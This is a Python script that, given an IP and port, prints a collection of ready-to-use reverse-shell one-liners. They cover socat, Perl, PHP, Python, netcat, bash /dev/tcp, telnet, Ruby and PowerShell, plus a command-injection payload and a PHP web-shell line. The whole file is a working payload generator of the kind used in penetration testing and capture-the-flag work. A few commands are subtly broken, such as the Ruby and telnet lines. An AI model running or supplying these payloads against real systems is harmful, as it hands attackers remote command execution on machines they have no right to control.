#!/usr/bin/python
#revshells is a tool to quickly print a collection of reverse shells usign diferent commands and languajes
#for quick access copy it to your path (/bin, /usr/bin, /usr/local/bin, etc)
#by dplastico (thanks to vay3t for teh heads up)
import sys
import socket

# usage
if len(sys.argv) != 3:
    print("[!] usage: "+sys.argv[0]+" <IP> <PORT>")
    sys.exit(1)

# Vars
ipDst = sys.argv[1]
portDst = int(sys.argv[2])


try:
    if 1 <= portDst <= 65535:
        pass
    else:
        raise ValueError
except ValueError:
    print("[!] Invalid Port")
    sys.exit(2)

# Validation
try:
	socket.inet_aton(ipDst)
except socket.error:
	print("[!] Invalid IP")
	sys.exit(2)

portDst = str(portDst)

# Shell list
a = "socat TCP4:%s:%s EXEC:bash,pty,stderr,setsid,sigint,sane" %(ipDst,portDst)
b = "perl -e 'use Socket;$i=\"%s\";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'" %(ipDst,portDst)
c = "php -r '$sock=fsockopen(\"%s\",%s);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" %(ipDst,portDst)
d = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"%s\",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" %(ipDst,portDst)
e = "nc -e /bin/sh %s %s" %(ipDst,portDst)
f = "bash -i >& /dev/tcp/%s/%s 0>&1" %(ipDst,portDst)
g = "127.0.0.1;bash -i >& /dev/tcp/%s/%s 0>&1" %(ipDst,portDst)
h = "/bin /telnet %s 80 | /bin/bash | /bin/telnet %s 25" %(ipDst,portDst)
i = "mknod backpipe p && telnet %s %s 0<backpipe | /bin/bash 1>backpipe" %(ipDst,portDst)
l = "mknod /var/tmp/fgp p ; /bin/sh 0</var/tmp/fgp |nc %s %s 1>/var/tmp/fgp" %(ipDst,portDst)
m = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f " %(ipDst,portDst)
n = "ruby -rsocket -e'f=TCPSocket.open(\"%s\",%s).to_i;exec slog.infof(\"/bin/sh -i <&%%d >&%%d 2>&%%d\",f,f,f)'" %(ipDst,portDst)
o = "exec 5<>/dev/tcp/%s/%s; while read line 0<&5; do $line 2>&5 >&5; done" %(ipDst,portDst)
p = 'mknod /var/tmp/fgp p ; /bin/sh 0</var/tmp/fgp |nc %s %s 1>/var/tmp/fgp' %(ipDst,portDst)
q = "\n******** PowerShell Reverse Shells********\n"
#windows reverse shells
r = '$client = New-Object System.Net.Sockets.TCPClient(\"'+ipDst+'\",'+portDst+');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%\{0\};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' #%(ipDst,portDst)
s = 'powershell.exe -c "$c = New-Object System.Net.Sockets.TCPClient(\"'+ipDst+'\",'+portDst+');$str = $c.GetStream();[byte[]]$b = 0..65535|%\{0\};while(($i = $str.Read($b, 0, $b.Length)) -ne 0){;$d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sendback = (iex $d 2>&1 | Out-String );$sendback2 = $sendback + "PS"  + (pwd).Path + "> ";$sb = ([text.encoding]::ASCII).GetBytes($sendback2);$str.Write($sb,0,$sb.Length);$str.Flush()};$c.Close()"' #%(ipDst,portDst)
#one liners
t = "\n******** PHP reverse one liner********\n"
u = '<?php echo shell_exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f");?>' %(ipDst,portDst)


# Printer
print("\n******** Reverse Shells Linux *******\n")
for line in (a,b,c,d,e,f,g,h,i,l,m,n,o,p,q,r,s,t,u):
	print("[\033[1;34m*\033[0m] "+line)


                              
